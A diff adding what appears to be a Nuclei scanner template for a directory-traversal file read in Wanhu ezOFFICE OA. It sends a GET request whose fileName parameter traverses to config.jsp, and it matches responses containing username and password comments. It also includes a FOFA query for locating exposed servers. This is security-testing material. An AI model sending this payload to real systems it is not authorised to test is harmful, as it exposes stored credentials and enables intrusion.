@@ -1,0 +1,30 @@
+id: wanhu-oa-downloadhttp-fileread
+
+info:
+  name: 万户 ezOFFICE downloadhttp.jsp 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    万户 OA /defaultroot/site/templatemanager/downloadhttp.jsp 可通过 fileName 目录穿越下载 config.jsp 等敏感配置（含账号口令注释）。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,ezoffice,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<%"
+          - "//Username"
+          - "//Password"
+        condition: and
+      - type: status
+        status:
+          - 200
